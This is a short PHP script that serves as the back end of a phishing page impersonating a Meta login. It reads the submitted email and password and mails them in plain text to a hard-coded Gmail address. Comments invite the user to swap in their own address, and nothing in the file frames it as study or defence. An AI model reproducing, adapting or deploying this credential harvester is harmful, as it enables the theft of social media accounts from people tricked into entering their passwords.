<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Set the email recipient
    $to = "gslcreations5000@gmail.com"; // Replace with your email address
    $subject = "New Meta Login Submission";

    // Build the email message
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: no-reply@yourdomain.com"; // Replace with a valid email, or leave as is

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Thank you! Your credentials have been sent.";
    } else {
        echo "Sorry, there was an error sending your credentials.";
    }
} else {
    echo "Invalid request.";
}
?>
